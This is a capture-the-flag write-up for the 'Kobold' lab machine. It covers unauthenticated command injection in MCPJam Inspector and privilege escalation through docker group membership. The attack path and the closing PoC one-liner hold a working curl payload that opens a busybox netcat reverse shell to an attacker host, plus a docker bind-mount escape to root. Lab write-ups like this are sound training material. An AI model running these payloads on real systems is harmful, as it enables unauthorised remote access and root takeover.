---
layout: default
title: "Kobold"
parent: Easy Machines
grand_parent: Machines
permalink: /machines/easy/kobold/
---

# Kobold

![Machine Badge](https://img.shields.io/badge/Machine-Kobold-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Season](https://img.shields.io/badge/Season-10%20Week%208-purple)

| Property | Value |
|----------|-------|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | 2026-03-21 (Season 10, Week 8) |
| **Creator** | sau123 |
| **Tags** | #mcp #ai #cve-2026-23744 #rce #docker-escape #busybox |

---

## Summary

Kobold targets **MCPJam Inspector v1.4.2**, a developer tool for testing Model Context Protocol (MCP) servers. The `/api/mcp/connect` endpoint passes the `command` field directly into Node.js `child_process.spawn()` with no authentication or sanitisation (**CVE-2026-23744**), giving unauthenticated RCE. Initial foothold lands as user `ben`. Privilege escalation is via a dormant `docker` group membership - `newgrp docker` activates it, after which a privileged container with the host root filesystem bind-mounted gives full root.

---

## External Writeups

- [HTB-Andres (Beehiiv)](https://htb-writeup.beehiiv.com/p/kobold-machine-hackthebox)
- [Hassan Hamadi](https://www.hassanhamadi.me/writeups/htb-kobold)
- [Security Walay](https://securitywalay.com/blogs/kobold-htb-writeup/)
- [Hack With Husnain](https://hackwithhusnain.com/kobold-htb-machine-walkthrough/)
- [CyberSecGuru: Mastering Kobold](https://thecybersecguru.com/ctf-walkthroughs/mastering-kobold-beginners-guide-from-hackthebox/)
- [Medium - ItsSunshineXD](https://itssunshinexd.medium.com/htb-writeup-kobold-b20aa17eb3a0)
- [Medium - Adhilbinmujeeb](https://medium.com/@adhilbinmujeeb/hackthebox-kobold-03e7bc1ec32e)
- [Axura (Protected)](https://4xura.com/writeups-for-ctfs/htb/htb-writeup-kobold/)
- [The Pentesting Ninja (Protected)](https://blog.thepentesting.ninja/protected/htb-kobold/)
- [Undercode Testing](https://undercodetesting.com/kobold-machine-pwned-master-htb-season-10-a-step-by-step-guide-to-linux-pentesting-mastery-video/)

---

## Key Techniques

- **CVE-2026-23744**: Unauthenticated RCE in MCPJam Inspector `/api/mcp/connect`
- `child_process.spawn()` command injection (Node.js)
- MCP server registration as RCE primitive
- Busybox reverse shell payload
- Dormant `docker` group activation via `newgrp`
- Docker container escape via host root bind mount

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC kobold.htb
# 22/tcp  ssh
# 80/tcp  http -> MCPJam Inspector v1.4.2
```

### 2. CVE-2026-23744 - Unauth RCE

The vulnerability sits in the API endpoint that connects to MCP servers. Body is parsed and `command` is passed to `child_process.spawn(command, args)` with **no auth, no allowlist**:

```bash
curl -s -X POST http://kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <ATTACKER> 4444 -e /bin/sh"]
}
JSON
```

Listener catches shell as `ben`:

```bash
nc -lvnp 4444
# whoami -> ben
```

### 3. Privilege Escalation - Docker Group

```bash
id
# uid=1000(ben) gid=1000(ben) groups=1000(ben)

# But supplementary groups not yet active in the spawned shell - check /etc/group
grep docker /etc/group
# docker:x:998:ben

newgrp docker
id
# uid=1000(ben) ... groups=1000(ben),998(docker)
```

With `docker` group, escape to root:

```bash
docker run -v /:/host --rm -it alpine chroot /host bash
# whoami -> root
cat /root/root.txt
```

---

## Lessons Learned

- MCP / AI dev tooling expects "trusted local environment" - never expose to network.
- `child_process.spawn(userInput, ...)` without an allowlist is RCE by design.
- `docker` group membership = root equivalent. Sub-shells may not auto-load supplementary groups; `newgrp` re-evaluates `/etc/group`.
- Container escape via bind-mounted host root is the canonical post-docker-group move - no kernel exploit, no breakout magic, just `-v /:/host`.

---

## PoC One-Liner

```bash
TARGET=kobold.htb; LHOST=10.10.14.5; LPORT=4444; \
curl -s -X POST http://$TARGET/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"x\",\"command\":\"busybox\",\"args\":[\"sh\",\"-c\",\"busybox nc $LHOST $LPORT -e /bin/sh\"]}"
```
